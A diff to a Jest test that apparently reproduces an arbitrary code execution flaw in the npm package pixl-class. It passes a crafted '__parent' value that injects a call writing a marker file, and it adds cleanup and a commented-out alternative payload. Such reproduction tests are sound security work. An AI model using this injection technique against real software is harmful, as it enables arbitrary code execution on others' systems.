@@ -4,6 +4,12 @@ test("Arbitrary code execution in pixl-class", () => {
   const a = require("pixl-class");
   const path = "./pixl-class";
 
+  try {
+    fs.unlinkSync(path);
+    console.log("File removed:", path);
+  } catch (err) {
+    console.error(err);
+  }
   //checking that its not present already
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
@@ -13,9 +19,15 @@ test("Arbitrary code execution in pixl-class", () => {
       'function(){}; require("fs").writeFileSync("./pixl-class",""); //}',
   };
 
+  // var members = {
+  //   __parent:'function(){}; console.log(123)//}'
+  // }
+
   try {
     a.create(members);
-  } catch (e) {}
+  } catch (e) {
+    // console.error(e);
+  }
 
   //checking that its created by after exploit.
   file_exist = fs.existsSync(path);
